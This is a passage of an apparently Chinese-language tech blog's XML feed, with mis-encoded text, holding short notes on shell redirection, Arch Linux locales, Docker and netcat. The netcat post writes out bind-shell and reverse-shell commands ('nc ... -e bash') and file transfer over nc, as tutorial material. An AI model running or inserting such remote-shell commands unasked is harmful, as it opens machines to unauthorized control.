    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://askubuntu.com/questions/959066/what-does-mean-exactly-in-output-redirection">å‚è€ƒ1</a></h1><p>ç¬¬ä¸€ä¸ª:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">2&gt;&amp;1<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>&amp;</code> è¡¨æ˜ <code>1</code> æ˜¯ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦, è€Œä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶å.</p><p>å¦‚æœæ˜¯:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">2&gt;1<br></code></pre></td></tr></table></figure><p>è¿™ä¼šå°†æ ‡å‡†é”™è¯¯æµ (standard error) è¾“å‡ºåˆ° <code>1</code> è¿™ä¸ªæ–‡ä»¶ä¸­.</p><p>ç¬¬äºŒç§:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">&amp;&gt;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>&amp;</code> è¡¨ç¤ºæ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡º, å³ä¸¤è€…éƒ½ä¸€èµ·é‡å®šå‘.</p><p>ç¬¬ä¸‰ç§:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">&gt;&amp;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå’Œ <code>&amp;&gt;</code> çš„å«ä¹‰ä¸€æ ·, å°±æ˜¯æœ‰ç‚¹è¿·æƒ‘.</p><p>ä¸€ä¸‹ä¸‰ä¸ªçš„å«ä¹‰ç›¸åŒ:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">&amp;&gt;word</span><br>&gt;<span class="hljs-meta">&amp;word</span><br>&gt;word <span class="hljs-number">2</span>&gt;<span class="hljs-meta">&amp;1</span><br></code></pre></td></tr></table></figure><h1 id="ç¾¤å‹æä¾›"><a href="#ç¾¤å‹æä¾›" class="headerlink" title="ç¾¤å‹æä¾›"></a>ç¾¤å‹æä¾›</h1><p><img src="/../img/redirect.png" alt="redirect1"><br><img src="/../img/redirection2.png" alt="redirect2"></p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-Locale-éƒ¨åˆ†</title>
    <link href="/2022/09/28/ArchWiki-Locale-%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/28/ArchWiki-Locale-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Locale">ArchWiki ç›¸å…³é¡µé¢</a><br>glibc å’Œåº”ç”¨ç¨‹åº, å‡½æ•°åº“, ä½¿ç”¨ locale è®¾ç½®æ¥æ˜¾ç¤ºæœ¬åœ°çš„æ–‡å­—, è´§å¸, æ—¶é—´, æ—¥æœŸ, ç‰¹æ®Šå­—ç¬¦ç­‰åŒ…å«åœ°åŸŸå±æ€§çš„å†…å®¹.</p><h1 id="ç”ŸæˆåŒºåŸŸè®¾ç½®"><a href="#ç”ŸæˆåŒºåŸŸè®¾ç½®" class="headerlink" title="ç”ŸæˆåŒºåŸŸè®¾ç½®"></a>ç”ŸæˆåŒºåŸŸè®¾ç½®</h1><p>åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„åŒºåŸŸè®¾ç½®:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ locale -a<br></code></pre></td></tr></table></figure><p>å¯ç”¨ä¸€ä¸ªåŒºåŸŸè®¾ç½®å‰, éœ€è¦å…ˆç”Ÿæˆå®ƒ, åœ¨ <code>/etc/locale.gen</code> ä¸­å–æ¶ˆå¯¹åº”çš„æ³¨é‡Š, ç„¶åæ‰§è¡Œ <code>locale-gen</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ locale-gen<br></code></pre></td></tr></table></figure><h1 id="è®¾ç½®å½“å‰åŒºåŸŸ"><a href="#è®¾ç½®å½“å‰åŒºåŸŸ" class="headerlink" title="è®¾ç½®å½“å‰åŒºåŸŸ"></a>è®¾ç½®å½“å‰åŒºåŸŸ</h1><p>æ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨çš„ Locale å’Œç›¸å…³ç¯å¢ƒå˜é‡:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ locale<br></code></pre></td></tr></table></figure><p>è¦ä½¿ç”¨çš„åŒºåŸŸè®¾ç½®è®¾ç½®åœ¨ <code>locale.conf</code> æ–‡ä»¶ä¸­.</p><p>æŸ¥çœ‹å·²ç»ç”Ÿæˆçš„åŒºåŸŸè®¾ç½®:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ localedef --list-archive<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ localectl list-locales<br></code></pre></td></tr></table></figure><h2 id="ç³»ç»ŸåŒºåŸŸè®¾ç½®"><a href="#ç³»ç»ŸåŒºåŸŸè®¾ç½®" class="headerlink" title="ç³»ç»ŸåŒºåŸŸè®¾ç½®"></a>ç³»ç»ŸåŒºåŸŸè®¾ç½®</h2><p>è‹¥è¦è®¾ç½®æ•´ä¸ªç³»ç»Ÿä½¿ç”¨çš„åŒºåŸŸè®¾ç½®, éœ€è¦åœ¨ <code>/etc/locale.conf</code> ä¸­å†™å…¥ <code>LANG</code> å˜é‡.</p><p>è®¾ç½®:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ localectl set-locale LANG=zh_CN.UTF-8<br></code></pre></td></tr></table></figure><h2 id="åœ¨ç”¨æˆ·ä¼šè¯ä¸­è¦†ç›–ç³»ç»ŸåŒºåŸŸè®¾ç½®"><a href="#åœ¨ç”¨æˆ·ä¼šè¯ä¸­è¦†ç›–ç³»ç»ŸåŒºåŸŸè®¾ç½®" class="headerlink" title="åœ¨ç”¨æˆ·ä¼šè¯ä¸­è¦†ç›–ç³»ç»ŸåŒºåŸŸè®¾ç½®"></a>åœ¨ç”¨æˆ·ä¼šè¯ä¸­è¦†ç›–ç³»ç»ŸåŒºåŸŸè®¾ç½®</h2><p>è‹¥ç³»ç»Ÿè®¾ç½®ä¸ºä¸­æ–‡, ä½ å¯ä»¥é€šè¿‡ä¿®æ”¹è‡ªå·±ç”¨æˆ·çš„é…ç½®ä½¿ç³»ç»Ÿè®¾ç½®æ— æ•ˆ.</p><p>ç¼–è¾‘ <code>~/.config/locale.conf</code> (å³ <code>~/$XDG_CONFIG_HOME/locale.conf</code>)</p><p>è¿™äº› <code>locale.conf</code> æ–‡ä»¶çš„ä¼˜å…ˆçº§å®šä¹‰åœ¨ <code>/etc/profile.d/locale.sh</code> ä¸­.</p><p>å»ºç«‹ <code>/etc/skel/.config/locale.conf</code> æ–‡ä»¶, å¯ä»¥è®©æ‰€æœ‰é€šè¿‡ useradd å‘½ä»¤å’Œ <code>-m</code> é€‰é¡¹åˆ›å»ºçš„æ–°ç”¨æˆ·è‡ªåŠ¨æ‹¥æœ‰ä¸€ä»½ç›¸åº”çš„ <code>~/.config/locale.conf</code></p><h2 id="ç«‹å³å¯ç”¨"><a href="#ç«‹å³å¯ç”¨" class="headerlink" title="ç«‹å³å¯ç”¨"></a>ç«‹å³å¯ç”¨</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">unset</span> LANG<br>$ <span class="hljs-built_in">source</span> /etc/profile.d/locale.sh<br></code></pre></td></tr></table></figure><h1 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h1><p>å…·ä½“è§ wiki.</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åªéœ€è¦å…ˆ <code>unset LANG</code>, ç„¶å <code>export LANG=zh_CN.UTF-8</code> å°±å¯ä»¥åˆ‡æ¢è¯­è¨€.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è®°å½•-archlinux-çš„å®¹å™¨æ— æ³•ä½¿ç”¨-systemctl</title>
    <link href="/2022/09/27/%E8%AE%B0%E5%BD%95-archlinux-%E7%9A%84%E5%AE%B9%E5%99%A8%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8-systemctl/"/>
    <url>/2022/09/27/%E8%AE%B0%E5%BD%95-archlinux-%E7%9A%84%E5%AE%B9%E5%99%A8%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8-systemctl/</url>
    
    <content type="html"><![CDATA[<p>è‹¥ä½¿ç”¨ä¸€ä¸‹å‘½ä»¤:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> xinetd<br></code></pre></td></tr></table></figure><p>åˆ™ä¼šæŠ¥é”™å¦‚ä¸‹:</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">System has <span class="hljs-built_in">not</span> been booted <span class="hljs-keyword">with</span> systemd <span class="hljs-keyword">as</span> init system (PID <span class="hljs-number">1</span>). Can<span class="hljs-comment">&#x27;t operate.</span><br>Failed <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span> bus: Host <span class="hljs-built_in">is</span> down   <br></code></pre></td></tr></table></figure><p>å…¶æŠ¥é”™å³åŸå› .</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>docker-è‡ªåŠ¨é€€å‡ºè§£å†³</title>
    <link href="/2022/09/27/docker-%E8%87%AA%E5%8A%A8%E9%80%80%E5%87%BA%E8%A7%A3%E5%86%B3/"/>
    <url>/2022/09/27/docker-%E8%87%AA%E5%8A%A8%E9%80%80%E5%87%BA%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.php.cn/docker/490893.html">å‚è€ƒ</a></p><h1 id="docker-ä¼šè‡ªåŠ¨é€€å‡ºçš„åŸå› "><a href="#docker-ä¼šè‡ªåŠ¨é€€å‡ºçš„åŸå› " class="headerlink" title="docker ä¼šè‡ªåŠ¨é€€å‡ºçš„åŸå› "></a>docker ä¼šè‡ªåŠ¨é€€å‡ºçš„åŸå› </h1><ul><li>docker å®¹å™¨æ²¡æœ‰å‰å°è¿›ç¨‹, å®¹å™¨è®¤ä¸ºç©ºé—², æ‰€ä»¥é€€å‡º</li><li>æ²¡æœ‰ä¸€ç›´æŒ‚èµ·çš„å‘½ä»¤</li></ul><h1 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h1><p>åŠ ä¸€ä¸ª <code>bin/bash</code> è®©å®¹å™¨è¿è¡Œ.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æŸ¥çœ‹-docker-å®¹å™¨çš„-ip</title>
    <link href="/2022/09/27/%E6%9F%A5%E7%9C%8B-docker-%E5%AE%B9%E5%99%A8%E7%9A%84-ip/"/>
    <url>/2022/09/27/%E6%9F%A5%E7%9C%8B-docker-%E5%AE%B9%E5%99%A8%E7%9A%84-ip/</url>
    
    <content type="html"><![CDATA[<p><a href="t.zoukankan.com/halberd-lee-p-12519294.html">å‚è€ƒ</a></p><h1 id="è·å–å•ä¸ªå®¹å™¨çš„-IP"><a href="#è·å–å•ä¸ªå®¹å™¨çš„-IP" class="headerlink" title="è·å–å•ä¸ªå®¹å™¨çš„ IP"></a>è·å–å•ä¸ªå®¹å™¨çš„ IP</h1><p>å¯ä»¥ä½¿ç”¨å‘½ä»¤:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">$ docker inspect --format &#x27;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">.NetworkSettings.IPAddress</span> &#125;&#125;</span><span class="language-xml">&#x27; <span class="hljs-tag">&lt;<span class="hljs-name">container-ID</span>&gt;</span> </span><br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker inspect &lt;container <span class="hljs-built_in">id</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">$ docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">range</span> .NetworkSettings.Networks&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.IPAddress</span>&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">end</span>&#125;&#125;</span><span class="language-xml">&#x27; container_name_or_id</span><br></code></pre></td></tr></table></figure><h1 id="è·å–æ‰€æœ‰å“¦å®¹å™¨çš„-IP"><a href="#è·å–æ‰€æœ‰å“¦å®¹å™¨çš„-IP" class="headerlink" title="è·å–æ‰€æœ‰å“¦å®¹å™¨çš„ IP"></a>è·å–æ‰€æœ‰å“¦å®¹å™¨çš„ IP</h1><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">$ docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Name</span>&#125;&#125;</span><span class="language-xml"> - </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.NetworkSettings.IPAddress</span> &#125;&#125;</span><span class="language-xml">&#x27; $(docker ps -aq)</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p>è‹¥æ— è¾“å‡º, è¡¨ç¤ºè¯¥ comtainer æ²¡æœ‰ IP åœ°å€.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨-ENTRYPOINT-ä¸­ç”¨-exec-çš„ä½œç”¨</title>
    <link href="/2022/09/26/%E5%9C%A8-ENTRYPOINT-%E4%B8%AD%E7%94%A8-exec-%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
    <url>/2022/09/26/%E5%9C%A8-ENTRYPOINT-%E4%B8%AD%E7%94%A8-exec-%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://stackoverflow.com/questions/32255814/what-purpose-does-using-exec-in-docker-entrypoint-scripts-serve">å‚è€ƒ</a><br>åœ¨ shell è„šæœ¬ä¸­ä½¿ç”¨ <code>exec</code>, å¦‚: <code>exec gosu redis &quot;$@&quot;</code>. å…¶ä¼šæ›¿æ¢æ‰çˆ¶è¿›ç¨‹, è€Œä¸æ˜¯è¿è¡Œä¸¤ä¸ªè¿›ç¨‹.</p><p>æ²¡æœ‰ <code>exec</code> çš„è¯, parent shell ä¼š process survives ç„¶åç­‰å¾…å­è¿›ç¨‹ exit.</p><p>ä¸€ä¸ªç”¨æˆ·çš„å›å¤:</p><p>without exec:</p><ul><li>parent shell starts</li><li>parent shell forks child<ul><li>child runs</li><li>child exit</li></ul></li><li>parent shell exit</li></ul><p>with exec:</p><ul><li>parent shell starts</li><li>parent shell forks child, replaces itself with child</li><li>child program runs taking over the shellâ€™s process</li><li>child exits</li></ul>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ¯æ¬¡-docker-å¯åŠ¨å®¹å™¨æ—¶éƒ½ä¼šè®©è¯¥å®¹å™¨æ‰§è¡ŒæŸä¸ªè„šæœ¬</title>
    <link href="/2022/09/26/%E6%AF%8F%E6%AC%A1-docker-%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8%E6%97%B6%E9%83%BD%E4%BC%9A%E8%AE%A9%E8%AF%A5%E5%AE%B9%E5%99%A8%E6%89%A7%E8%A1%8C%E6%9F%90%E4%B8%AA%E8%84%9A%E6%9C%AC/"/>
    <url>/2022/09/26/%E6%AF%8F%E6%AC%A1-docker-%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8%E6%97%B6%E9%83%BD%E4%BC%9A%E8%AE%A9%E8%AF%A5%E5%AE%B9%E5%99%A8%E6%89%A7%E8%A1%8C%E6%9F%90%E4%B8%AA%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p><a href="https://stackoverflow.com/questions/59871513/how-can-i-make-the-docker-container-to-run-a-script-every-time-when-the-containe">å‚è€ƒ stackoverflow</a><br>åœ¨æ„å»º Dockerfile æ—¶ä½¿ç”¨ <code>ENTRYPOINT</code>, å…¶ä½œç”¨å°±æ˜¯æ¯æ¬¡ container è¢«å¯åŠ¨æ—¶éƒ½ä¼šæ‰§è¡Œè¿™åé¢çš„å‘½ä»¤.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>nmtui-å‘½ä»¤é…ç½®ç½‘ç»œæœåŠ¡</title>
    <link href="/2022/09/26/nmtui-%E5%91%BD%E4%BB%A4%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1/"/>
    <url>/2022/09/26/nmtui-%E5%91%BD%E4%BB%A4%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-CNSS-PWN-æ–¹å‘è·å–é¢˜ç›®</title>
    <link href="/2022/09/26/%E5%85%B3%E4%BA%8E-CNSS-PWN-%E6%96%B9%E5%90%91%E8%8E%B7%E5%8F%96%E9%A2%98%E7%9B%AE/"/>
    <url>/2022/09/26/%E5%85%B3%E4%BA%8E-CNSS-PWN-%E6%96%B9%E5%90%91%E8%8E%B7%E5%8F%96%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<p>æ¯”å¦‚é¢˜å¹²è¦æ±‚:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nc <span class="hljs-number">119.3</span>.<span class="hljs-number">83.106</span> <span class="hljs-number">10001</span><br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ç”¨ netcat è¿›è¡Œè¿æ¥, è¿æ¥å¥½åå¹¶æ²¡æœ‰å‡ºç°æç¤ºç¬¦, å¯èƒ½æ²¡æœ‰è®¾, ç›´æ¥ <code>ls</code> å°±å¯ä»¥çœ‹åˆ°æ–‡ä»¶.</p>]]></content>
    
    
    <categories>
      
      <category>CNSS</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>nc-å‘½ä»¤ç›¸å…³</title>
    <link href="/2022/09/26/nc-%E5%91%BD%E4%BB%A4%E7%9B%B8%E5%85%B3/"/>
    <url>/2022/09/26/nc-%E5%91%BD%E4%BB%A4%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://wangchujiang.com/linux-command/c/nc.html">å‚è€ƒ1</a></h1><p>nc å‘½ä»¤æ˜¯ netcat çš„ç®€ç§°. èƒ½å¤Ÿé€šè¿‡ TCP å’Œ UDP åœ¨ç½‘ç»œä¸­è¯»å†™æ•°æ®.</p><h1 id="å‚è€ƒ2-Wiki"><a href="#å‚è€ƒ2-Wiki" class="headerlink" title="å‚è€ƒ2 Wiki"></a><a href="https://en.wikipedia.org/wiki/Netcat">å‚è€ƒ2 Wiki</a></h1><p>netcat æœ‰å¾ˆå¤šåŠŸèƒ½, å¦‚: ç«¯å£æ‰«æ, ä¼ è¾“æ–‡ä»¶, ç«¯å£ç›‘å¬ç­‰.</p><p>åœ¨ man page ä¸­æŸ¥çœ‹ç›¸å…³ä¿¡æ¯: <code>man netcat</code></p><h1 id="å‚è€ƒ3-Bç«™"><a href="#å‚è€ƒ3-Bç«™" class="headerlink" title="å‚è€ƒ3 Bç«™"></a><a href="https://b23.tv/ewf5t40">å‚è€ƒ3 Bç«™</a></h1><h2 id="è¿æ¥"><a href="#è¿æ¥" class="headerlink" title="è¿æ¥"></a>è¿æ¥</h2><h3 id="æ­£å‘è¿æ¥"><a href="#æ­£å‘è¿æ¥" class="headerlink" title="æ­£å‘è¿æ¥"></a>æ­£å‘è¿æ¥</h3><p>æ¥å—è¿æ¥çš„ä¸€æ–¹:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nc -lp <span class="hljs-number">10001</span> -e bash<br></code></pre></td></tr></table></figure><p>å‘èµ·è¿æ¥çš„ä¸€æ–¹:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nc <span class="hljs-number">192.168</span>.<span class="hljs-number">1.102</span> <span class="hljs-number">10001</span> <br></code></pre></td></tr></table></figure><p><code>nc</code> åŠ  IP åœ°å€åŠ ç«¯å£å·, ç”¨äºç›´æ¥è¿æ¥, å³æ­£å‘è¿æ¥. æˆ‘ä»¬çŸ¥é“éœ€è¦è¢«æ§åˆ¶çš„ä¸€æ–¹çš„ IP åœ°å€.</p><h3 id="åå‘è¿æ¥"><a href="#åå‘è¿æ¥" class="headerlink" title="åå‘è¿æ¥"></a>åå‘è¿æ¥</h3><p>åå‘è¿æ¥, ç”±å—æ§æ–¹ä¸»åŠ¨å‘èµ·è¿æ¥, ç”¨ <code>-e</code> å‚æ•°å°†è‡ªå·±çš„ shell è¿”å›ç»™ç›‘å¬ç«¯.</p><p>éœ€è¦è¿æ¥ shell çš„ä¸€æ–¹, ç›‘å¬ 233 ç«¯å£:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nc -lvp <span class="hljs-number">233</span><br></code></pre></td></tr></table></figure><p><code>-l</code> æ˜¯ <code>--listen</code> è¿™ä¸ªå‚æ•°å³æ‰“å¼€ç›‘å¬.</p><p><code>-v</code> æ˜¯ <code>--verbose</code>.</p><p><code>-p</code> æ˜¯ <code>--local-port</code> æŒ‡å®šæœ¬åœ°çš„ä¸€ä¸ªç«¯å£.</p><p>éœ€è¦è¿”å› shell çš„ä¸€æ–¹:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nc <span class="hljs-number">192.168</span>.<span class="hljs-number">1.101</span> <span class="hljs-number">233</span> -e bash -v<br></code></pre></td></tr></table></figure><p><code>-e</code> æ˜¯ <code>--exec</code> åé¢æ¥ä¸€ä¸ªå‘½ä»¤, è¡¨ç¤ºåœ¨è¿æ¥ä¹‹åè¿æ¥.</p><h2 id="ä¼ è¾“"><a href="#ä¼ è¾“" class="headerlink" title="ä¼ è¾“"></a>ä¼ è¾“</h2><p>ä½¿ç”¨é‡å®šå‘ç¬¦ <code>&lt;</code> å’Œ <code>&gt;</code> ä¼ è¾“å•ä¸ªæ–‡ä»¶.</p><p>å°†æ–‡ä»¶æ”¾åœ¨ç›‘å¬çª—å£:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ nc -lvp <span class="hljs-number">233</span> &lt; test<span class="hljs-selector-class">.sql</span> -<span class="hljs-selector-tag">q</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>åé¢çš„ <code>-q 1</code> è¡¨ç¤ºåœ¨æ–‡ä»¶ä¼ è¾“å®Œ 1 ç§’åæ–­å¼€è¿æ¥.</p><p>è·å–æ–‡ä»¶:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ nc <span class="hljs-number">192.168</span>.<span class="hljs-number">1.102</span> <span class="hljs-number">233</span> &gt; <span class="hljs-keyword">test</span>.sql -v<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>test.sql</code> åº”è¯¥æ˜¯è‡ªå·±å‘½åå§.</p><h3 id="å°†æ–‡ä»¶å‹ç¼©åä¼ è¾“"><a href="#å°†æ–‡ä»¶å‹ç¼©åä¼ è¾“" class="headerlink" title="å°†æ–‡ä»¶å‹ç¼©åä¼ è¾“"></a>å°†æ–‡ä»¶å‹ç¼©åä¼ è¾“</h3><p>å¦‚:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> tar -cvf - <span class="hljs-keyword">file</span>/ | nc -lvp <span class="hljs-number">233</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>tar</code> çš„ä¸‰ä¸ªå‚æ•°, <code>-c</code> ä¸º <code>--create</code>, å³åˆ›å»ºä¸€ä¸ª archive. <code>-v</code> ä¸º <code>--verbose</code>, å³ä¼šæ˜¾ç¤ºå¾ˆå¤šä¿¡æ¯. <code>-f</code> æ˜¯ <code>--file</code> å³æŒ‡å®šè¦å‹ç¼©çš„æ–‡ä»¶.</p><h3 id="è§£å‹"><a href="#è§£å‹" class="headerlink" title="è§£å‹"></a>è§£å‹</h3><p>å¦‚:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">$ nc -v <span class="hljs-number">192.168</span>.<span class="hljs-number">1.102</span> <span class="hljs-number">233</span> <span class="hljs-string">| tar -xvf -</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„è§£å‹å‘½ä»¤, <code>-x</code> è¡¨ç¤º <code>--extract</code>, è¡¨ç¤ºè§£å‹.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Git-push-æ—¶-pre-recieve-hook-declined-é—®é¢˜</title>
    <link href="/2022/09/26/Git-push-%E6%97%B6-pre-recieve-hook-declined-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/26/Git-push-%E6%97%B6-pre-recieve-hook-declined-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>å¯èƒ½æ˜¯ push çš„æ–‡ä»¶è¿‡å¤§.</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Dockerfile-ä¸­çš„-VOLUME-æŒ‡ä»¤</title>
    <link href="/2022/09/26/%E5%85%B3%E4%BA%8E-Dockerfile-%E4%B8%AD%E7%9A%84-VOLUME-%E6%8C%87%E4%BB%A4/"/>
    <url>/2022/09/26/%E5%85%B3%E4%BA%8E-Dockerfile-%E4%B8%AD%E7%9A%84-VOLUME-%E6%8C%87%E4%BB%A4/</url>
    
